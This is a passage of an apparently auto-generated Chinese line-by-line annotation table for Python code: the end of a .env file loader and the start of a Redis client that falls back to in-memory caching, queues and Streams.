| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    env_path = Path(path) if path is not None else Path.cwd() / ".env"` |
| 24 | 条件判断：满足条件时进入对应分支。 | `    if not env_path.exists() or not env_path.is_file():` |
| 25 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        lines = env_path.read_text(encoding="utf-8").splitlines()` |
| 29 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except OSError:` |
| 30 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 循环：逐个处理集合或迭代器中的元素。 | `    for raw in lines:` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        line = raw.strip()` |
| 34 | 条件判断：满足条件时进入对应分支。 | `        if not line or line.startswith("#") or "=" not in line:` |
| 35 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 36 | 函数调用：执行已有函数/方法完成当前步骤。 | `        key, value = line.split("=", 1)` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        key = key.strip()` |
| 38 | 条件判断：满足条件时进入对应分支。 | `        if not key or key in os.environ:` |
| 39 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        value = value.strip()` |
| 41 | 条件判断：满足条件时进入对应分支。 | `        if len(value) >= 2 and value[0] == value[-1] and value[0] in ("'", '"'):` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value = value[1:-1]` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        os.environ[key] = value` |

## `src/utils/redis_client.py`

- 类型：通用工具
- 行数：627

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `Redis 轻量客户端 + 内存降级适配层（Phase 8 集成与降级）` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `对应架构文档 §11 部署架构 & Phase 8 D 节 / E 节` |
| 4 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `设计目标：` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    1. 在 Redis 可用时，作为缓存 / 轻量消息队列使用` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    2. Redis 不可用时自动回退到 **进程内内存实现**，保证主流程不被阻断` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    3. 提供统一的对外接口，调用方无需关心底层实现` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    4. 初始化失败（依赖缺失、连接超时、鉴权失败）不抛异常，记录日志并降级` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `对外接口：` |
| 12 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - get(key) / set(key, value, ttl=None)       缓存` |
| 13 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - delete(key)                                 缓存` |
| 14 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - push(queue, message) / pop(queue)           轻量队列（FIFO List）` |
| 15 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - ping()                                      健康检查` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - is_available                                当前是否真正连上 Redis` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - mode                                        'redis' \| 'memory'` |
| 18 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - Streams（Phase 8+）：` |
| 19 | 函数调用：执行已有函数/方法完成当前步骤。 | `        stream_add(stream, fields, maxlen=None)` |
| 20 | 函数调用：执行已有函数/方法完成当前步骤。 | `        stream_ensure_group(stream, group)` |
| 21 | 函数调用：执行已有函数/方法完成当前步骤。 | `        stream_read_group(stream, group, consumer, count, block_ms)` |
| 22 | 函数调用：执行已有函数/方法完成当前步骤。 | `        stream_read_own_pending(stream, group, consumer, count)` |
| 23 | 函数调用：执行已有函数/方法完成当前步骤。 | `        stream_autoclaim(stream, group, consumer, min_idle_ms, start, count)` |
| 24 | 函数调用：执行已有函数/方法完成当前步骤。 | `        stream_ack(stream, group, ids)` |
| 25 | 函数调用：执行已有函数/方法完成当前步骤。 | `        stream_pending(stream, group)` |
| 26 | 函数调用：执行已有函数/方法完成当前步骤。 | `        stream_len(stream)` |
| 27 | 函数调用：执行已有函数/方法完成当前步骤。 | `      Streams 在内存模式下用 (str id, dict fields) + 已投递 / 已 ack 集合模拟，` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `      行为对 consumer group 语义足够近似，可作为开发 / 单元测试兜底。` |
| 29 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 30 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import itertools` |
| 33 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 34 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 35 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import threading` |
| 36 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 37 | 导入对象：从指定模块引入类、函数或常量。 | `from collections import deque` |
| 38 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Deque, Dict, List, Optional, Set, Tuple` |
| 39 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 40 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 43 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 44 | 注释：解释下面或当前这段代码的设计意图。 | `# 内存模式 Streams 实现（极简版）` |
| 45 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 46 | 类定义：声明 `_InMemoryStream`，封装相关状态与行为。 | `class _InMemoryStream:` |
| 47 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Redis Streams 的最简内存模拟。` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 函数调用：执行已有函数/方法完成当前步骤。 | `    - 每条消息是 (stream_id, fields_dict)` |
| 50 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - stream_id 使用单调递增整数（格式 \`0-N\`）以模拟 Redis 的 \`ms-seq\`` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 每个 group 维护 \`pending\`（已发送但未 ack）与 \`delivered_ids\`` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - maxlen 软上限：超过即从头丢弃` |
| 53 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self) -> None:` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.entries: List[Tuple[str, Dict[str, Any]]] = []` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._id_counter = itertools.count(1)` |
| 58 | 注释：解释下面或当前这段代码的设计意图。 | `        # group -> {"consumers": {"c1": [ids]}, "pending": {id: consumer}, "last_id": str}` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.groups: Dict[str, Dict[str, Any]] = {}` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 函数定义：声明 `next_id` 的输入、处理逻辑和返回结果。 | `    def next_id(self) -> str:` |
| 62 | 返回结果：把处理后的值交回调用方。 | `        return f"0-{next(self._id_counter)}"` |
| 63 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 64 | 函数定义：声明 `trim` 的输入、处理逻辑和返回结果。 | `    def trim(self, maxlen: Optional[int]) -> None:` |
| 65 | 条件判断：满足条件时进入对应分支。 | `        if maxlen is None or maxlen <= 0:` |
| 66 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 67 | 条件判断：满足条件时进入对应分支。 | `        if len(self.entries) > maxlen:` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self.entries = self.entries[-maxlen:]` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 71 | 类定义：声明 `RedisClient`，封装相关状态与行为。 | `class RedisClient:` |
| 72 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Redis 适配客户端，Redis 不可用时自动降级到内存实现。` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 代码语句：参与当前文件的业务流程或数据处理。 | `    调用方只需实例化一次，通过 :pyattr:\`is_available\` / :pyattr:\`mode\`` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `    判断当前运行模式，其余调用方法对两种模式完全透明。` |
| 76 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 77 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _CONNECT_TIMEOUT: float = 2.0` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _SOCKET_TIMEOUT: float = 2.0` |
| 80 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 81 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        host: str = "localhost",` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        port: int = 6379,` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        db: int = 0,` |
| 86 | 占位语句：保持语法完整但当前不执行操作。 | `        password: str = "",` |
| 87 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.host = host` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.port = int(port)` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.db = int(db)` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.password = password or None` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._client = None` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._mode: str = "memory"` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 注释：解释下面或当前这段代码的设计意图。 | `        # 内存降级态` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._mem_lock = threading.Lock()` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._mem_cache: Dict[str, Tuple[Any, Optional[float]]] = {}  # key -> (value, expire_at_ts)` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._mem_queues: Dict[str, Deque[str]] = {}` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._mem_streams: Dict[str, _InMemoryStream] = {}` |
| 101 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._try_connect()` |
| 103 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 104 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 105 | 注释：解释下面或当前这段代码的设计意图。 | `    # 初始化 / 重连` |
| 106 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 107 | 函数定义：声明 `_try_connect` 的输入、处理逻辑和返回结果。 | `    def _try_connect(self) -> None:` |
| 108 | 文档字符串：说明当前模块、类或函数的职责。 | `        """尝试初始化 Redis 连接；失败时静默降级到内存模式。"""` |
| 109 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 110 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `            import redis  # type: ignore` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            client = redis.Redis(` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                host=self.host,` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                port=self.port,` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                db=self.db,` |
| 116 | 占位语句：保持语法完整但当前不执行操作。 | `                password=self.password,` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                socket_connect_timeout=self._CONNECT_TIMEOUT,` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                socket_timeout=self._SOCKET_TIMEOUT,` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                decode_responses=True,` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                health_check_interval=30,` |
| 121 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 122 | 函数调用：执行已有函数/方法完成当前步骤。 | `            client.ping()` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._client = client` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._mode = "redis"` |
| 125 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info(` |
| 126 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "[RedisClient] Redis 连接成功 host=%s port=%s db=%s",` |
| 127 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.host,` |
| 128 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.port,` |
| 129 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self.db,` |
| 130 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 131 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ImportError:` |
| 132 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[RedisClient] redis 依赖未安装，降级到内存模式")` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._client = None` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._mode = "memory"` |
| 135 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:` |
| 136 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning(` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[RedisClient] Redis 连接失败，自动降级到内存模式: %s", exc` |
| 138 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._client = None` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._mode = "memory"` |
| 141 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 142 | 函数定义：声明 `reconnect` 的输入、处理逻辑和返回结果。 | `    def reconnect(self) -> bool:` |
| 143 | 文档字符串：说明当前模块、类或函数的职责。 | `        """显式重连 Redis；成功则切回 redis 模式。"""` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._try_connect()` |
| 145 | 返回结果：把处理后的值交回调用方。 | `        return self.is_available` |
| 146 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 147 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 148 | 注释：解释下面或当前这段代码的设计意图。 | `    # 属性` |
| 149 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 150 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 151 | 函数定义：声明 `is_available` 的输入、处理逻辑和返回结果。 | `    def is_available(self) -> bool:` |
| 152 | 文档字符串：说明当前模块、类或函数的职责。 | `        """当前是否真正连接到 Redis。"""` |
| 153 | 返回结果：把处理后的值交回调用方。 | `        return self._client is not None and self._mode == "redis"` |
| 154 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 155 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 156 | 函数定义：声明 `mode` 的输入、处理逻辑和返回结果。 | `    def mode(self) -> str:` |
| 157 | 文档字符串：说明当前模块、类或函数的职责。 | `        """当前运行模式: 'redis' \| 'memory'。"""` |
| 158 | 返回结果：把处理后的值交回调用方。 | `        return self._mode` |
| 159 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 160 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 161 | 注释：解释下面或当前这段代码的设计意图。 | `    # 健康检查` |
| 162 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 163 | 函数定义：声明 `ping` 的输入、处理逻辑和返回结果。 | `    def ping(self) -> bool:` |
| 164 | 文档字符串：说明当前模块、类或函数的职责。 | `        """健康检查。Redis 断开时自动降级。"""` |
| 165 | 条件判断：满足条件时进入对应分支。 | `        if self._client is None:` |
| 166 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 167 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 168 | 返回结果：把处理后的值交回调用方。 | `            return bool(self._client.ping())` |
| 169 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:` |
| 170 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[RedisClient] ping 失败，降级到内存模式: %s", exc)` |
| 171 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._degrade()` |
| 172 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 173 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 174 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 175 | 注释：解释下面或当前这段代码的设计意图。 | `    # 缓存 API` |
| 176 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 177 | 函数定义：声明 `get` 的输入、处理逻辑和返回结果。 | `    def get(self, key: str) -> Optional[Any]:` |
| 178 | 文档字符串：说明当前模块、类或函数的职责。 | `        """读取缓存。"""` |
| 179 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 180 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 181 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw = self._client.get(key)  # type: ignore[union-attr]` |
| 182 | 条件判断：满足条件时进入对应分支。 | `                if raw is None:` |
| 183 | 返回结果：把处理后的值交回调用方。 | `                    return None` |
| 184 | 返回结果：把处理后的值交回调用方。 | `                return self._deserialize(raw)` |
| 185 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 186 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] get 失败降级: %s", exc)` |
| 187 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 188 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 189 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 190 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            item = self._mem_cache.get(key)` |
| 191 | 条件判断：满足条件时进入对应分支。 | `            if not item:` |
| 192 | 返回结果：把处理后的值交回调用方。 | `                return None` |
| 193 | 代码语句：参与当前文件的业务流程或数据处理。 | `            value, expire_at = item` |
| 194 | 条件判断：满足条件时进入对应分支。 | `            if expire_at is not None and time.time() > expire_at:` |
| 195 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._mem_cache.pop(key, None)` |
| 196 | 返回结果：把处理后的值交回调用方。 | `                return None` |
| 197 | 返回结果：把处理后的值交回调用方。 | `            return value` |
| 198 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 199 | 函数定义：声明 `set` 的输入、处理逻辑和返回结果。 | `    def set(self, key: str, value: Any, ttl: Optional[int] = None) -> bool:` |
| 200 | 文档字符串：说明当前模块、类或函数的职责。 | `        """写入缓存。ttl 单位秒；None 表示不过期。"""` |
| 201 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 202 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                serialized = self._serialize(value)` |
| 204 | 条件判断：满足条件时进入对应分支。 | `                if ttl is not None:` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    self._client.setex(key, int(ttl), serialized)  # type: ignore[union-attr]` |
| 206 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    self._client.set(key, serialized)  # type: ignore[union-attr]` |
| 208 | 返回结果：把处理后的值交回调用方。 | `                return True` |
| 209 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 210 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] set 失败降级: %s", exc)` |
| 211 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 212 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 213 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            expire_at = time.time() + ttl if ttl is not None else None` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._mem_cache[key] = (value, expire_at)` |
| 216 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 217 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 218 | 函数定义：声明 `delete` 的输入、处理逻辑和返回结果。 | `    def delete(self, key: str) -> bool:` |
| 219 | 文档字符串：说明当前模块、类或函数的职责。 | `        """删除缓存键。"""` |
| 220 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 221 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 222 | 返回结果：把处理后的值交回调用方。 | `                return bool(self._client.delete(key))  # type: ignore[union-attr]` |
| 223 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 224 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] delete 失败降级: %s", exc)` |
| 225 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 226 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 227 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 228 | 返回结果：把处理后的值交回调用方。 | `            return self._mem_cache.pop(key, None) is not None` |
| 229 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 230 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 231 | 注释：解释下面或当前这段代码的设计意图。 | `    # 轻量队列 API（FIFO；基于 Redis List 或内存 deque）` |
| 232 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 233 | 函数定义：声明 `push` 的输入、处理逻辑和返回结果。 | `    def push(self, queue: str, message: Any) -> bool:` |
| 234 | 文档字符串：说明当前模块、类或函数的职责。 | `        """将一条消息追加到队列尾部。"""` |
| 235 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 236 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 237 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self._client.rpush(queue, self._serialize(message))  # type: ignore[union-attr]` |
| 238 | 返回结果：把处理后的值交回调用方。 | `                return True` |
| 239 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 240 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] push 失败降级: %s", exc)` |
| 241 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 242 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 243 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            q = self._mem_queues.setdefault(queue, deque())` |
| 245 | 函数调用：执行已有函数/方法完成当前步骤。 | `            q.append(self._serialize(message))` |
| 246 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 247 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 248 | 函数定义：声明 `pop` 的输入、处理逻辑和返回结果。 | `    def pop(self, queue: str) -> Optional[Any]:` |
| 249 | 文档字符串：说明当前模块、类或函数的职责。 | `        """从队列头部弹出一条消息；空队列返回 None。"""` |
| 250 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 251 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw = self._client.lpop(queue)  # type: ignore[union-attr]` |
| 253 | 条件判断：满足条件时进入对应分支。 | `                if raw is None:` |
| 254 | 返回结果：把处理后的值交回调用方。 | `                    return None` |
| 255 | 返回结果：把处理后的值交回调用方。 | `                return self._deserialize(raw)` |
| 256 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 257 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[RedisClient] pop 失败降级: %s", exc)` |
| 258 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self._degrade()` |
| 259 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 260 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 261 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            q = self._mem_queues.get(queue)` |
| 262 | 条件判断：满足条件时进入对应分支。 | `            if not q:` |
| 263 | 返回结果：把处理后的值交回调用方。 | `                return None` |
| 264 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 265 | 返回结果：把处理后的值交回调用方。 | `                return self._deserialize(q.popleft())` |
| 266 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except IndexError:` |
| 267 | 返回结果：把处理后的值交回调用方。 | `                return None` |
| 268 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 269 | 函数定义：声明 `queue_len` 的输入、处理逻辑和返回结果。 | `    def queue_len(self, queue: str) -> int:` |
| 270 | 文档字符串：说明当前模块、类或函数的职责。 | `        """返回队列长度（不可用或异常时返回 0）。"""` |
| 271 | 条件判断：满足条件时进入对应分支。 | `        if self.is_available:` |
| 272 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 273 | 返回结果：把处理后的值交回调用方。 | `                return int(self._client.llen(queue))  # type: ignore[union-attr]` |
| 274 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:` |
| 275 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[RedisClient] llen 失败: %s", exc)` |
| 276 | 返回结果：把处理后的值交回调用方。 | `                return 0` |
| 277 | 上下文管理：自动管理资源打开与释放。 | `        with self._mem_lock:` |
| 278 | 返回结果：把处理后的值交回调用方。 | `            return len(self._mem_queues.get(queue, ()))` |
| 279 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 280 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 281 | 注释：解释下面或当前这段代码的设计意图。 | `    # Redis Streams API（消息队列升级版 — consumer group + ack）` |
| 282 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 283 | 函数定义：声明 `stream_add` 的输入、处理逻辑和返回结果。 | `    def stream_add(` |
| 284 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 285 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        stream: str,` |
| 286 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fields: Dict[str, Any],` |
| 287 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        maxlen: Optional[int] = None,` |
| 288 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        approximate: bool = True,` |
| 289 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> Optional[str]:` |
| 290 | 文档字符串：说明当前模块、类或函数的职责。 | `        """向流追加一条消息。` |
| 291 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
